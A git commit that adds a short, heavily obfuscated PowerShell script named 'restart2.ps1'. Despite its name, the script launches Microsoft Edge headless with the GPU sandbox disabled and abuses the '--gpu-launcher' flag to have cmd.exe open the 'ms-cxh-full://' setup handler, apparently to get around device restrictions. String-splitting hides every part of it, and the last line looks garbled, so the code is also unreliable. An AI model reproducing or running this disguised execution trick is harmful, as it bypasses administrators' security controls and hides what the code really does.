5bb9306d12c01eb85b0aeef9a81126a94d180427
itssixtyn3in <130003354+itssixtyn3in@users.noreply.github.com>
2024-03-27 11:04:10 -0700

    Create restart2.ps1

---
+++ restart2.ps1
@@ -0,0 +1,3 @@
+$P='C'+':\P'+('ro'+'gra'+'m '+('Fi'+'le'+'s '+'('+'x'+'86'+')\M'+('ic'+'ro'+'so'+'ft'+'\E'+('d'+'g'+'e\A'+'pp'+'lic'+'atio'+'n\ms'+('e'+'dg'+'e.'+'e'+'xe')))))
+$A='--d'+'isa'+'ble'+'-g'+'pu-s'+'an'+'dbo'+'x '+'--h'+'ea'+'dles'+'s '+'--g'+'pu'+'-la'+'un'+'che'+'r='+'\'C:\'+'Wi'+'nd'+'ows'+'\'+'sy'+'ste'+'m3'+'2\c'+'md.'+'ex'+'e /c '+'st'+'art m'+'s-'+'cxh'+'-f'+'ul'+'l://\''
+S-Pr'oc'ess -F'ileP'at'hw' $P -Ar'gume'ntL'ist' $A
